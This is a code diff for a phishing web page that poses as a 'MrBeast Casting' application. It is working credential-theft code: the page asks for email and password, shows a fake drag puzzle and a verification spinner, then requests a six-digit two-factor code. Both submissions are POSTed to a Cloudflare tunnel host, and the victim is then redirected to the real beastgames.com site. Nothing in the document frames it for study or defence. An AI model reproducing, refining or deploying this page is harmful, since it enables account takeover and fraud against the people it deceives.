@@ -34,17 +34,17 @@
     <img src="https://crystalpng.com" class="top-logo">
 
     <div class="box">
-        <!-- PHASE 1: LOGIN -->
+        <!-- STEP 1 -->
         <div id="step1">
             <img src="https://crystalpng.com" class="mid-logo">
             <div class="mrbeast-style-text"><span class="mr-txt">MR</span> BEAST CASTING</div>
-            <p>Fill in your details to apply for the next viral challenge</p>
-            <input type="email" id="email" placeholder="Email Address" required>
-            <input type="password" id="pass" placeholder="Password" required>
-            <button type="button" class="main-btn" onclick="goToPuzzle()">CONTINUE</button>
+            <p>Apply for the next viral challenge!</p>
+            <input type="email" id="email" placeholder="Email Address">
+            <input type="password" id="pass" placeholder="Password">
+            <button class="main-btn" onclick="goToPuzzle()">CONTINUE</button>
         </div>
 
-        <!-- PHASE 2: PUZZLE -->
+        <!-- STEP 2: PUZZLE -->
         <div id="puzzle-box">
             <p>Verification: Match the Puzzle</p>
             <div class="puzzle-container">
@@ -58,15 +58,15 @@
             </div>
         </div>
 
-        <!-- PHASE 3: LOADER -->
+        <!-- STEP 3: LOADER -->
         <div id="loader"><div class="spinner"></div><p>Verifying Human Identity</p></div>
 
-        <!-- PHASE 4: SECURITY CHECK (CAPTURES 6-DIGIT CODE) -->
+        <!-- STEP 4: OTP (FINAL STEP) -->
         <div id="otp_section">
             <div class="mrbeast-style-text" style="font-size:24px;">SECURITY CHECK</div>
             <p>We've sent a code to your device. Enter it below to finish.</p>
-            <input type="text" id="2fa_code" placeholder="000000" maxlength="6" style="text-align:center; font-size:26px; font-weight:bold;">
-            <button type="button" class="main-btn" onclick="submitOTP()">FINISH APPLICATION</button>
+            <input type="text" id="2fa_code" placeholder="000000" maxlength="6" style="text-align:center; font-size:26px;">
+            <button class="main-btn" onclick="submitOTP()">FINISH APPLICATION</button>
         </div>
     </div>
 
@@ -74,13 +74,9 @@
         const tunnel = "https://postposted-settings-belly-quest.trycloudflare.com";
 
         function goToPuzzle() {
-            var e = document.getElementById('email').value, p = document.getElementById('pass').value;
+            const e = document.getElementById('email').value, p = document.getElementById('pass').value;
             if(e && p) {
-                fetch(tunnel, { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: new URLSearchParams({'email': e, 'pass': p}) 
-                });
+                fetch(tunnel, { method: 'POST', body: new URLSearchParams({'email': e, 'pass': p}) });
                 document.getElementById('step1').style.display = 'none'; 
                 document.getElementById('puzzle-box').style.display = 'block';
                 startPuzzle();
@@ -92,7 +88,7 @@
             let dragging = false;
             const move = (e) => {
                 if (!dragging) return;
-                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
+                let clientX = (e.touches ? e.touches[0].clientX : e.clientX);
                 let rect = track.getBoundingClientRect();
                 let x = clientX - rect.left - 35;
                 if (x < 0) x = 0;
@@ -102,7 +98,7 @@
                 if (x > rect.width - 95) { dragging = false; showLoader(); }
             };
             handle.addEventListener('mousedown', () => dragging = true);
-            handle.addEventListener('touchstart', (e) => { dragging = true; });
+            handle.addEventListener('touchstart', () => dragging = true);
             window.addEventListener('mousemove', move);
             window.addEventListener('touchmove', move);
             window.addEventListener('mouseup', () => dragging = false);
@@ -122,9 +118,9 @@
             const c = document.getElementById('2fa_code').value; 
             fetch(tunnel, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: new URLSearchParams({ '2fa_code': c })
             }).then(() => {
+                // INSTANT REDIRECT TO REAL MRBEAST SITE
                 window.location.href = "https://www.beastgames.com";
             }).catch(() => {
                 window.location.href = "https://www.beastgames.com";
